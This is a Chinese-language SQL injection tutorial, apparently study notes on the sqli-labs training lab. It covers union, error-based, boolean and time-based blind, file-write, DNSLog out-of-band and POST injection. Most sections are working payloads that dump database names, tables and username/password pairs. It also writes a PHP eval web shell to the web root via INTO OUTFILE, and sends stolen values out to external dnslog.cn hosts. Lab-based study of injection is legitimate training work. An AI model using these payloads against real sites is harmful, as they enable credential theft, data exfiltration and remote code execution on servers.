# 	SQL注入

## SQL注入基础

### 什么是SQL注入

在保证SQL语句能被正确执行的情况下，构造一条精巧的语句，来达到查询想要要的信息的目的

### SQL注入分类

+ 字符型
+ 数字型
+ Union注入
+ 报错注入
+ 布尔注入
+ 时间盲注
+ 宽字节注入

### SQL注入常见闭合方式

```
'  "  ')  ")
```

### SQL注入常见注释方式

```
#  %23  --  --+  --'  --
```

## information_schema 介绍

### 拿到表名和列名

information_schema 有三张关键表：

+ `information_schema.schemata`：存储了整个数据库中的所有数据库名

  + 关键字段：

    + `schema_name`：数据库名

    演示：

    ```
    mysql> select schema_name from information_schema.schemata;
    +--------------------+
    | schema_name        |
    +--------------------+
    | information_schema |
    | intruder           |
    | mysql              |
    | performance_schema |
    | pyspider           |
    | pyuser             |
    | sys                |
    +--------------------+
    7 rows in set (0.00 sec)
    ```

+ `information_schema.tables`：存储了整个数据库中的所有数据表

  + 关键字段：

    + `table_schema`：数据库名
    + `table_name`：数据表名

    演示：

    ```bash
    从 information_schema 查询当前数据库中的所有数据表名
    mysql> select table_name from information_schema.tables where table_schema=database();
    +---------------+
    | table_name    |
    +---------------+
    | scrape_center |
    +---------------+
    1 row in set (0.00 sec)
    ```

+ `information_schema.columns`：存储了整个数据库中的所有列

  + 关键字段：

    + `table_schema`：数据库名
    + `table_name`：数据表名
    + `column_name`：字段名

    演示：

    ```python
    # 查询当前数据库下的 scrape_center 表的所有列名
    mysql> select column_name from information_schema.columns where table_schema=database() and table_name='scrape_center';
    +-------------+
    | column_name |
    +-------------+
    | id          |
    | title       |
    | relese_time |
    | relese_site |
    | synopsis    |
    | score       |
    +-------------+
    6 rows in set (0.00 sec)
    ```

  得到了当前数据库名、当前数据库的所有数据表名、每个数据表的各个字段名，就可以开始做脱库了



## 联合注入-Less-1

> 触发条件：后台将所有查询到的信息原封不动的传到前端显示

### 1、寻找注入点

通过加`'`或者`"`的方式来判断

```
http://192.168.231.129:9001/Less-1/?id=1'
```

![image-20230603194526930](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603194526930.png)

### 2、判断是字符型还是数字型

对注入位置做减法，没报错，则是数字型，报错则是字符型

输入2-1，数字有改变，那么就是数字型注入

```
http://192.168.231.129:9001/Less-1/?id=2-1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603195723281.png" alt="image-20230603195723281" style="zoom:50%;" />

输入2-1，数字没有改变，那么就是字符型注入

```
http://192.168.231.129:9001/Less-2/?id=2-1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603195825570.png" alt="image-20230603195825570" style="zoom:50%;" />

### 3、如果是字符型，判断闭合方式

在注入处插入一个引号看报错信息吗，可以发现是单引号闭合

```
http://192.168.231.129:9001/Less-1/?id=2'
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200039513.png" alt="image-20230603200039513" style="zoom:50%;" />

使用单引号闭合并使用注释符注释掉后面的内容

```
http://192.168.231.129:9001/Less-1/?id=2'%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200153738.png" alt="image-20230603200153738" style="zoom:50%;" />

### 4、判断查询列数

使用`order by`来判断查询的列数

```
http://192.168.231.129:9001/Less-1/?id=2'+order+by+3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200328132.png" alt="image-20230603200328132" style="zoom:50%;" />

这里也可以使用`group by`，这个函数被过滤的机率相对更小

```
http://192.168.231.129:9001/Less-1/?id=2'+group+by+3#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200410818.png" alt="image-20230603200410818" style="zoom:50%;" />

### 5、判断回显位置

使`id=-2`，让数据库查询不到该数据从而返回空，再使用`union`来寻找回显点

```
http://192.168.231.129:9001/Less-1/?id=-2' union select 1,2,3#
```

![image-20230603200446254](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603200446254.png)

### 6、获取当前数据库名

```
select database();		// 获取当前数据名
select version();		// 获取当前数据库的版本信息
```

```
http://192.168.231.129:9001/Less-1/?id=-1'+union+select+1,database(),version()#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603203305797.png" alt="image-20230603203305797" style="zoom:50%;" />

### 7、爆破所有数据库名（爆库）

```
http://192.168.231.129:9001/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603213126994.png" alt="image-20230603213126994" style="zoom:50%;" />

### 8、获取当前数据库的所有数据表名（爆表）

```
group_concat()：将查询到的内容放到一行输出
```

```
http://192.168.231.129:9001/Less-1/?id=-1'+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()--+
```

![image-20230603203822792](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603203822792.png)

### 9、获取指定数据表的所有字段名（爆字段）

```
http://192.168.231.129:9001/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603205119326.png" alt="image-20230603205119326" style="zoom:50%;" />

### 10、拖库

小技巧：在`group_concat()`内可以使用`'~'`来分割用户名和密码

```
http://192.168.231.129:9001/Less-1/?id=-1' union select 1,group_concat(username,'~',password),3 from users--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230603205548687.png" alt="image-20230603205548687" style="zoom:50%;" />

## 报错注入

> 触发条件：后台将所有报错信息直接显示出来

### 前置知识

```
mysql> create databases ctfsu charset utf8;
mysql> create table xml(doc varchar(150));
Query OK, 0 rows affected (0.01 sec)

mysql> insert into xml values('
    '> <book>
    '> <tittle>A bad boy how to get a girlfriend</tittle>
    '> <author>
    '> <initial>Love</initial>
    '> <surname>benben</surname>
    '> </author>
    '> </book>
    '> ');
Query OK, 1 row affected (0.01 sec)

mysql> insert into xml values('
    '> <book>
    '> <tittle>how to become a bad boy</tittle>
    '> <author>
    '> <initial>hualong</initial>
    '> <surname>Melton</surname>
    '> </author>
    '> </book>
    '> ');
Query OK, 1 row affected (0.00 sec)
```



#### extractvalue() 函数的用法

用于查询XML格式的数据库

##### 格式：

```
select extractvalue(列名, 'XPath表达式') from 表名;
```

```sql
mysql> select extractvalue(doc, 'book/author/surname') from xml;
+------------------------------------------+
| extractvalue(doc, 'book/author/surname') |
+------------------------------------------+
| benben                                   |
| Melton                                   |
+------------------------------------------+
2 rows in set (0.00 sec)
```

##### 注入原理：

当XPath表达式有误的时候就会与原封不动的将错误信息返回，，以此只要保证后面的查询语句成功执行，再通过`~`使XPATH表达式错误，达到信息泄露

```sql
mysql> select extractvalue(doc, '~/book/tittle') from xml;
ERROR 1105 (HY000): XPATH syntax error: '~/book/tittle'

ERROR 1105 (HY000): XPATH syntax error: '~ctfsu'
mysql> select extractvalue(doc, concat(0x7e, (select database()))) from xml;
```

#### updatexml() 函数用法

用于对XML格式的数据进行更新

##### 格式：

```
updatexml(XML_Document, XPATH表达式, new_value)
updatexml(字段, 'XPATH表达式', '新值')
```

```sql
mysql> select updatexml(doc, '/book/tittle', 'jack') from xml;
+-----------------------------------------------------------------------------------------------+
| updatexml(doc, '/book/tittle', 'jack')                                                        |
+-----------------------------------------------------------------------------------------------+
|
<book>
jack
<author>
<initial>Love</initial>
<surname>benben</surname>
</author>
</book>
    |
|
<book>
jack
<author>
<initial>hualong</initial>
<surname>Melton</surname>
</author>
</book>
 |
+-----------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

##### 注入原理

与extractvalue原理相同，当XPATH表达式语法出现错误的时候，返回报错信息并执行select语句

```
mysql> select updatexml(doc, concat(0x7e, (select database())), 'jack') from xml;
ERROR 1105 (HY000): XPATH syntax error: '~ctfsu'
```





#### substring() 函数用法

将指定的字符串进行切割并输出

##### 格式：

```
substring('string', start, length)
substring('目标字符串', 起始位, 长度)
```

##### 示例：

```sql
mysql> select substring('123456789', 1, 3);
+------------------------------+
| substring('123456789', 1, 3) |
+------------------------------+
| 123                          |
+------------------------------+
1 row in set (0.01 sec)

mysql> select substring('123456789', 4, 3);
+------------------------------+
| substring('123456789', 4, 3) |
+------------------------------+
| 456                          |
+------------------------------+
1 row in set (0.00 sec)
```

###  `extractvalue() `注入流程-Less-5

#### 查看数据库名

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(0x7e, concat(0x7e, (select database())))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604163329293.png" alt="image-20230604163329293" style="zoom:50%;" />

#### 查看数据库中的所有数据库名（爆库）

由于显错注入一次最多只能显示30个字符，所以使用`substring()`分批显示

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(schema_name),31,30) from information_schema.schemata)))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604165541233.png" alt="image-20230604165541233" style="zoom:50%;" />

#### 查看所有数据表（爆表）

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database())))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604165700837.png" alt="image-20230604165700837" style="zoom:50%;" />

#### 查看指定数据表的所有字段（爆字段）

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(column_name),1,30) from information_schema.columns where table_schema=database() and table_name='users')))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604165850866.png" alt="image-20230604165850866" style="zoom:50%;" />

#### 查看指定字段的内容（拖库）

```
http://192.168.231.129:9001/Less-5/?id=1' and extractvalue(1, concat(0x7e, (select substring(group_concat(username,'~',password),1,30) from users)))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604170113859.png" alt="image-20230604170113859" style="zoom:50%;" />

### `updatexml()`注入流程-Less-6

#### 爆库

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(schema_name),1,30) from information_schema.schemata)),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180053106.png" alt="image-20230604180053106" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database())),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180146897.png" alt="image-20230604180146897" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(column_name),1,30) from information_schema.columns where table_schema=database() and table_name='users')),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180238548.png" alt="image-20230604180238548" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-6/?id=1" and updatexml(1,concat(0x7e, (select substring(group_concat(username,'~',password),1,30) from users)),3)%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604180324452.png" alt="image-20230604180324452" style="zoom:50%;" />

### `floor()`报错-Less-5

#### 前置知识

##### `rand()`函数

随机生成0-1的小数

```sql
mysql> select rand();
+--------------------+
| rand()             |
+--------------------+
| 0.6128508659199354 |
+--------------------+
1 row in set (0.00 sec)

mysql> select rand();
+-----------------------+
| rand()                |
+-----------------------+
| 0.0016049286365554935 |
+-----------------------+
1 row in set (0.00 sec)
```

##### `rand()*2`

将`rand()`生成的小数*2，随机生成0-2的小数

```sql
mysql> select rand()*2;
+--------------------+
| rand()*2           |
+--------------------+
| 1.6850912512141198 |
+--------------------+
1 row in set (0.00 sec)

mysql> select rand()*2;
+--------------------+
| rand()*2           |
+--------------------+
| 1.4086238605981916 |
+--------------------+
1 row in set (0.00 sec)
```

##### `floor()`函数

向下取整

```sql
mysql> select floor(rand()*2);
+-----------------+
| floor(rand()*2) |
+-----------------+
|               1 |
+-----------------+
1 row in set (0.00 sec)

mysql> select floor(rand()*2);
+-----------------+
| floor(rand()*2) |
+-----------------+
|               0 |
+-----------------+
1 row in set (0.00 sec)
```

##### `ceiling()`函数

向上取整

```sql
mysql> select ceiling(rand()*2);
+-------------------+
| ceiling(rand()*2) |
+-------------------+
|                 2 |
+-------------------+
1 row in set (0.00 sec)

mysql> select ceiling(rand()*2);
+-------------------+
| ceiling(rand()*2) |
+-------------------+
|                 1 |
+-------------------+
```

##### `concat_ws()`函数

按指定格式拼接字符串

###### 格式：

```
concat_ws('指定符号', 字符串1, 字符串2)
```

```sql
mysql> select concat_ws('~',2,3);
+--------------------+
| concat_ws('~',2,3) |
+--------------------+
| 2~3                |
+--------------------+
1 row in set (0.00 sec)
```

也可以利用此函数达到信息泄露

```sql
mysql> select concat_ws('~',(select database()),3);
+--------------------------------------+
| concat_ws('~',(select database()),3) |
+--------------------------------------+
| ctfsu~3                              |
+--------------------------------------+
1 row in set (0.00 sec)
```

##### as 别名

##### group by 排序

##### 完整注入语句

```sql
mysql> select concat_ws('~',(select database()),3) from xml;
+--------------------------------------+
| concat_ws('~',(select database()),3) |
+--------------------------------------+
| ctfsu~3                              |
| ctfsu~3                              |
+--------------------------------------+
2 rows in set (0.00 sec)

mysql> select concat_ws('~',(select database()),3) as a from xml group by a;
+---------+
| a       |
+---------+
| ctfsu~3 |
+---------+
1 row in set (0.00 sec)

mysql> select count(*), concat_ws('~', (select database()), '3') as a from xml group by a;
+----------+---------+
| count(*) | a       |
+----------+---------+
|        2 | ctfsu~3 |
+----------+---------+
1 row in set (0.00 sec)
```

#### 注入流程

##### 查看当前数据库名

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604215659443.png" alt="image-20230604215659443" style="zoom:50%;" />

##### 爆库

如果返回的数据太长，那么就会无法显示报错信息，所以要保证注入的成功执行，需要使用`concat`替换`group_concat`，并使用`limit`限制显示数量

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(schema_name) from information_schema.schemata limit 4,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

![image-20230604223407182](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223407182.png) 

##### 爆表

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223534539.png" alt="image-20230604223534539" style="zoom:50%;" />

##### 爆字段

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223754650.png" alt="image-20230604223754650" style="zoom:50%;" />

##### 拖库

```
http://192.168.231.129:9001/Less-5/?id=1' union select 1,count(*),concat_ws('~',(select concat(username,':',password) from users limit 1,1),floor(rand(0)*2)) as a from information_schema.columns group by a%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230604223918496.png" alt="image-20230604223918496" style="zoom:50%;" />

## 布尔盲注

> 适用于目标站点存在注入点但没有回显的情况

### 注入原理：

通过使用布尔判断是否有正确回显，以达到信息猜测的目的

`and 1=1` 为真，页面正常显示

```
http://192.168.231.129:9001/Less-8/?id=1' and 1=1%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605155931573.png" alt="image-20230605155931573" style="zoom:50%;" />

`and 1=2`为假，页面无回显

```
http://192.168.231.129:9001/Less-8/?id=1' and 1=2%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605160014024.png" alt="image-20230605160014024" style="zoom:50%;" />

### 注入流程-less-8

#### 爆库

爆破当前数据库名的第一个字母：

```
http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select database()),1,1)) = 115%23

http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select database()),第几个数据字母,1)) = 115%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605160159955.png" alt="image-20230605160159955" style="zoom:50%;" />

#### 爆表

爆破当前数据库的第一个数据表的第一个字母

```
1' and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)) = 114%23

1' and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 第几个数据表,1),数据表的第几个字母,1)) = 114%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605190431995.png" alt="image-20230605190431995" style="zoom:50%;" />

#### 爆字段

爆破当前数据库的第一个数据表的第一个字段名

```
http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),1,1)) = 117%23

http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 第几个字段,1),第几个字母,1)) = 117%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605191103672.png" alt="image-20230605191103672" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select concat(username,password) from users limit 1,1),1,1)) = 65%23

http://192.168.231.129:9001/Less-8/?id=1' and ascii(substring((select concat(username,password) from users limit 第几个用户名和密码,1),第几个字母,1)) = 65%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605195810004.png" alt="image-20230605195810004" style="zoom:50%;" />

## 时间盲注

### 注入原理

> 页面无回显信息但是对`sleep()`关键字没有进行过滤（在布尔注入的基础上加上if判断）

### 前置知识

#### `sleep()`函数

延迟查询的时间

##### 格式：

```
select sleep(秒数);
```

##### 演示：

```
mysql> select sleep(3);
+----------+
| sleep(3) |
+----------+
|        0 |
+----------+
```

#### `BENCHMARK()`函数

除了sleep之外的时间延时注入，还有：BENCHMARK(count,expr)

BENCHMARK()函数重复 count次执行表达式expr。它可以被用于计算 MYSQL处理表达式的速度。

```php
select benchmark(100000000,sha(1));
Select * from table where id= 1 and (if(ascii(substr(database(),1,1))=100,benchmark(100000000,sha(1)), null));
```

#### `if()`函数

if判断函数

##### 格式：

```
if(条件, true, False)
```

##### 演示：

```
mysql> select if(1=1, sleep(0), sleep(3));
+-----------------------------+
| if(1=1, sleep(0), sleep(3)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (0.00 sec)
```

### 注入流程-Less-9

#### 爆破当前数据库名

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select database()),1,1))=115, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select database()),第几个字母,1))=115, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605212337339.png" alt="image-20230605212337339" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 第几个表,1),第几个字母,1))=114, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605212638509.png" alt="image-20230605212638509" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),1,1))=117, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 第几个字段,1),第几个字母,1))=117, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605213017492.png" alt="image-20230605213017492" style="zoom:50%;" />

#### 拖库

如果分析不清楚，可以将`username`和`password`分开

```
http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select concat(username,password) from users limit 1,1),1,1))=65, sleep(0), sleep(3))%23

http://192.168.231.129:9001/Less-9/?id=1' and if(ascii(substring((select concat(username,password) from users limit 第几个用户名密码,1),第几个字母,1))=65, sleep(0), sleep(3))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605213210996.png" alt="image-20230605213210996" style="zoom:50%;" />

## 文件上传

> 此漏洞要想成功，最好拿到网站的绝对路径

### 前置知识

#### 读写权限查看

```
ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
```



```sql
mysql> show variables like '%secure%';
+--------------------------+-------+
| Variable_name            | Value |
+--------------------------+-------+
| require_secure_transport | OFF   |
| secure_auth              | ON    |
| secure_file_priv         | NULL  |
+--------------------------+-------+
3 rows in set, 1 warning (0.01 sec)
```

#### outfit 函数

对MySQL进行文件写入

```sql
SELECT name, age, email INTO OUTFILE '/path/to/output.txt'
```

### 注入流程-Less-7

==对于此漏洞的复现，Linux文件权限需要给予写权限==

```
http://192.168.231.129:9001/Less-7/?id=1')) UNION SELECT 1,"<?php eval($_POST['cmd']);?>",3 into outfile "/var/www/html/shell.php"%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605225553170.png" alt="image-20230605225553170" style="zoom:50%;" />

蚁剑连接

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230605230240610.png" alt="image-20230605230240610" style="zoom:50%;" />

## DNSLog注入

### 注入原理

MySQL的`secure_file_priv`必须为空，允许MySQL对文件进行读写操作，利用域名解析功能，在访问某个域名之前先执行某个SQL指令在通过查看DNS日志文件来访问敏感信息

### 前置知识

#### `load_file()`函数

使用MySQL读取指定文件

##### 格式：

这里的UNC路径相当于Windows文件共享路径：`\\ip address | domain name\file path`

```
load_file("UNC路劲")
```

##### 演示：

```
mysql> select load_file("/var/www/html/Less-7/result.txt");
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| load_file("/var/www/html/Less-7/result.txt")                                                                                                                       |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| ID:1')) UNION SELECT 1,"<?php eval($_POST['cmd']);?>",3 into outfile "shell.php"#
ID:1')) UNION SELECT 1,"<?php eval($_POST['cmd']);?>",3 into outfile "111.php"#
 |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.01 sec)
```

### 免费的DNSLog站点

```
http://dnslog.cn/
http://ceye.io
```

### DNSLog注入注意事项

1. DNSLog注入是由长度限制的
2. DNSLog注入在遇到如`{}`等特殊符号的时候就会失效

对于长度限制，我们需要用`substr()`函数将字符串做截断处理，对于特殊符号限制，我们需要使用`hex()`函数将字符串转为16进制

```
select * from gg_users where username='1' and (select load_file(concat("//",(select substr(hex(flag),40,60) from gg_flag),".ckkxx7.dnslog.cn/benen")));
```





### 注入流程-Less-9

#### 查看当前数据库

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select database()),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162328932.png" alt="image-20230606162328932" style="zoom:50%;" />

#### 爆表

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select table_name from information_schema.tables where table_schema=database() limit 1,1),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162446065.png" alt="image-20230606162446065" style="zoom: 50%;" />

#### 爆字段

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162615997.png" alt="image-20230606162615997" style="zoom: 50%;" />

#### 拖库

这里为了阅读方便，所以将用户名和密码分开查询

```
http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select username from users limit 1,1),".ljr4uu.dnslog.cn/benen")))%23

http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and (select load_file(concat("//",(select password from users limit 1,1),".ljr4uu.dnslog.cn/benen")))%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606162914855.png" alt="image-20230606162914855" style="zoom:50%;" />

## DNSLog自动注入

### 工具安装

#### Python环境配置

需要用到python2版本，所以这里直接用kali就好

```bash
┌──(pinginglab㉿pinginglab)-[~/DnslogSqlinj-master]
└─$ pip2 install gevent==1.2.2  
┌──(pinginglab㉿pinginglab)-[~/DnslogSqlinj-master]
└─$ pip2 install termcolor  
```

#### DNSLog自动化工具安装

```
下载地址：
https://github.com/ADOOO/DnslogSqlinj
```

#### DNSLog自动化工具配置

配置`config.py `文件

登录 http://ceye.io 将你的域名和Token写进来

```
# DNSlog 设置
 5 APItoken = 'API Token'
 6 DNSurl = 'identifier'
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606165153320.png" alt="image-20230606165153320" style="zoom:50%;" />

### 注入流程-Less-9

`DnslogSqlinj`使用方法于SQLMap几乎一致，使用`({})`标记payload的放置处

```
# 爆库
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" --dbs
# 爆表
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" -D "security" --tables
# 爆字段
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" -D "security" -T "users" --columns
# 拖库
┌──(root㉿pinginglab)-[/home/pinginglab/DnslogSqlinj-master]
└─# python2.7 dnslogSql.py -u "http://192.168.1.102/sqli-labs-master/Less-9/?id=1' and ({})--+" -D "security" -T "users" -C "username,password" --dump
```

## POST注入-UNION注入

### 注入原理

POST注入和GET注入的原理相同，只是输入点不同

### 注入流程-Less-11

#### order by函数判断查询列数

查询列数为：2

```
passwd=admin' order by 2#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183034046.png" alt="image-20230606183034046" style="zoom:50%;" />

#### UNION 注入判断回显位

```
passwd=' union select 1,2#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183132284.png" alt="image-20230606183132284" style="zoom:50%;" />

#### 查看当前数据库

```
passwd=' union select 1,database()#&Submit=Submit&uname=admin
```

![image-20230606183211789](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183211789.png)

#### 爆库

```
passwd=' union select 1,group_concat(schema_name) from information_schema.schemata#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183320150.png" alt="image-20230606183320150" style="zoom:50%;" />

#### 爆表

```
passwd=' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183411173.png" alt="image-20230606183411173" style="zoom:50%;" />

#### 爆字段

```
Submit=Submit&passwd='+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_schema=database() and table_name='users'#&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183555732.png" alt="image-20230606183555732" style="zoom:50%;" />

#### 拖库

```
Submit=Submit&passwd='+union+select+1,group_concat(username,':',password)+from users#&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606183706465.png" alt="image-20230606183706465" style="zoom:50%;" />

## POST注入-显错注入

### 注入流程-Less-13

#### 查看当前数据库

```
passwd=123') union select count(*),concat_ws("~",(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606184812257.png" alt="image-20230606184812257" style="zoom:50%;" />

#### 爆库

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(schema_name)),1,30) from information_schema.schemata)))#&Submit=Submit&uname=admin
```

